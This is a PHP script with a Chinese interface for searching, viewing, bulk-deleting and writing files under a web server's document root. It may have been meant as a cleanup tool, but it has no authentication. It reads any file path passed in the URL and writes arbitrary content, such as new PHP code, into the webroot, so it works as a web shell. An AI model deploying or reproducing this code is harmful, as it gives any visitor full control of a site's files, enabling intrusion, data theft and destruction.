set_time_limit(0);
ini_set('memory_limit', '-1');
ini_set('max_execution_time', 0);
$wwwroot=$_SERVER['DOCUMENT_ROOT'];
$keyword=isset($_POST['keyword'])?trim($_POST['keyword']):'';
$preg_exp=isset($_POST['keyword'])?trim($_POST['keyword']):'';
$search_type=isset($_POST['search_type'])?trim($_POST['search_type']):'';
$view_file=isset($_GET['view_file'])?trim($_GET['view_file']):'';
$del_file=isset($_GET['del_file'])?trim($_GET['del_file']):'';
$write_file=isset($_POST['write_file'])?trim($_POST['write_file']):'';
$write_content=isset($_POST['write_content'])?trim($_POST['write_content']):'';
$del_file_paths=isset($_POST['del_file_paths'])?trim($_POST['del_file_paths']):'';

if ( $keyword!='' )
{
    $keyword_arr=array();
    foreach(explode('|||',$keyword) as $keyword1)
    {
        $keyword1=trim($keyword1);
        if ($keyword1!='')
        {
            $keyword_arr[]=$keyword1;
        }
    }

    $find_count=0;

    $dir_arr=array();
    $j=0;
    $dir_arr[0][]=$wwwroot;
    while(!empty($dir_arr[$j]))
    {
        foreach($dir_arr[$j] as $parent_dir)
        {
            $child_dir_arr=glob($parent_dir."/*",GLOB_ONLYDIR | GLOB_BRACE);
            foreach($child_dir_arr as $child_dir)
            {
                $dir_arr[$j+1][]=$child_dir;
            }
        }
        $j++;
    }
    echo '<a href="">返回</a>';
    foreach($dir_arr as $sub_dir_arr)
    {
        foreach($sub_dir_arr as $dir1)
        {
            $file_arr=glob($dir1.'/*');
            echo '
            <style>
                .results_display{
                    width: 100%;
                    border-collapse: collapse;
                }
                .results_display tr{
                    border-bottom: 1px solid #ccc;
                }
                .results_display tr td{
                    padding: 8px auto;
                    margin-left: 10px;
                    margin-right: 10px;
                }
            </style>
            <table class="results_display">';
            foreach($file_arr as $file1)
            {
                echo '<tr>';
                if ($search_type=='normal')
                {
                    $match_count=0;
                    foreach($keyword_arr as $keyword1)
                    {
                        if ( strpos(file_get_contents($file1),$keyword1)===false )
                        {
                            break;
                        }else
                        {
                            $match_count++;
                        }
                    }
                    if ( $match_count==count($keyword_arr) )
                    {
                        echo '<td>'.$file1.'</td>';
                        echo '<td><a href="?view_file='.$file1.'" target="_blank">查看代码</a></td>';
                        echo '<td><a href="'.str_replace($wwwroot,'',$file1).'" target="_blank">访问URL</a></td>';
                        echo '<td><a href="?del_file='.$file1.'" target="_blank">删除</a></td>';
                        $find_count++;
                    }
                }
                if ($search_type=='preg')
                {
                    if ( preg_match($preg_exp,file_get_contents($file1),$matches) )
                    {
                        echo '<td>'.$file1.'</td>';
                        echo '<td><a href="?view_file='.$file1.'" target="_blank">查看代码</a></td>';
                        echo '<td> <a href="'.str_replace($wwwroot,'',$file1).'" target="_blank">访问URL</a></td>';
                        echo '<td><a href="?del_file='.$file1.'" target="_blank">删除</a></td>';
                        echo '<td><font color="orange">'.$matches[0].'</font></td>';
                        $find_count++;
                    }
                }
                echo '</tr>';
            }
            echo '</table>';
        }
    }
    echo '<br><br>共找到 '.$find_count.' 个文件<br>'."\r\n";
}elseif( $view_file!='' )
{
    header("Content-type:text/plain");
    $file_content=is_file($view_file) ? file_get_contents($view_file) : $view_file.' --> 文件不存在';
    echo $file_content;
}elseif( $del_file!='' )
{
    @unlink($del_file);
    $message=is_file($del_file) ? '<font color="red">删除失败</font>' : '<font color="green">删除成功</font>';
    echo $del_file.' --> '.$message;
}elseif( $del_file_paths!='' )
{
    $del_file_paths=str_replace("\r",'',$del_file_paths);
    $del_file_path_arr=explode("\n",$del_file_paths);
    echo '<a href="">返回</a><br>';
    foreach($del_file_path_arr as $del_file_path1)
    {
        $del_file_path_a=trim($del_file_path1);
        if ( $del_file_path_a!='' )
        {
            $del_file_path_a=str_replace($wwwroot,'',$del_file_path_a);
            $del_file_path_a=$wwwroot.$del_file_path_a;
            if ( is_file($del_file_path_a) )
            {
                chmod($del_file_path_a,0777);
                file_put_contents($del_file_path_a,'#');
                unlink($del_file_path_a);
                echo $del_file_path_a.' --> 已删除<br>';
            }
        }
    }
}elseif( $write_file!='' )
{
    $write_file=$wwwroot.$write_file;
    $write_md5=md5($write_content);
    if ( is_file($write_file) ) unlink($write_file);
    $write_dir=dirname($write_file);
    if (!is_dir($write_dir)) mkdir($write_dir,0755,true);
    file_put_contents($write_file,$write_content);
    echo '<a href="">返回</a>';
    if ( is_file($write_file) )
    {
        $read_md5=md5(file_get_contents($write_file));
        if ($write_md5==$read_md5)
        {
            echo $write_file.' <font color="green">写入成功！</font> --> <a href="?view_file='.$write_file.'" target="_blank">查看</a>';
        }else
        {
            echo $write_file.' <font color="red">写入失败！</font>';
        }
    }else
    {
        echo $write_file.' <font color="red">写入失败！</font>';
    }
}else
{
    echo '
<style>
    ul li {
        display: inline
    }
    ul li span {
        display: inline-block;
        border: 1px solid #ccc;
        padding: 5px 8px;
        margin: 0;
    }
</style>
<div style="display: grid;place-items: center">
    <ul>
        <li onclick="show(\'show1\')"><span>文件查找</span></li>
        <li onclick="show(\'show2\')"><span>批量删除</span></li>
        <li onclick="show(\'show3\')"><span>写入文件</span></li>
    </ul>
    <div>
        <div id="show1" hidden="hidden">
            <form name="file_search" action="" method="post">
                在'.$wwwroot.'目录中遍历查找符合要求的所有文件：
                <table>
                    <tr>
                        <td>关键词</td>
                        <td>
                            <input type="text" size="30" name="keyword">
                            <select name="search_type">
                                <option value="normal">普通字符串</option>
                                <option value="preg">正则表达式</option>
                            </select>
                        </td>
                        <td>(多个词用|||分割)</td>
                    </tr>
                    <tr>
                        <td colspan="3" align="center"><input type="submit" name="submit" value="提交"> <br><br></td>
                    </tr>
                </table>
            </form>
        </div>
        <div id="show2" hidden="hidden">
            <form name="file_del" action="" method="post">
                <p><label>待删文件路径(一行一条,用/开头代表网站根目录)：</label></p>
                <textarea rows="30" cols="120" name="del_file_paths"></textarea> <br><br>
                <input type="submit" name="submit2" value="提交"> <br><br>
            </form>
        </div>
        <div id="show3" hidden="hidden">
            <form name="file_write" action="" method="post">
                写入文件路径：<br>'.$wwwroot.'<input type="text" size="50" name="write_file" value=""> <br><br>
                写入文件内容：<br><textarea rows="30" cols="120" name="write_content"></textarea> <br><br>
                <input type="submit" name="submit3" value="提交"> <br><br>
            </form>
        </div>
    </div>
</div>
<script>
    window.onload = function() {
        var element = document.getElementById(\'show1\');
        element.removeAttribute(\'hidden\');
    };
    function show(showid) {
        var contents = document.querySelectorAll(\'[id^="show"]\');
        contents.forEach(function(content) {
            content.hidden = true;
        });

        var e = document.getElementById(showid);
        if (e) {
            e.hidden = false;
        }
    }
</script>
    ';
}
?>
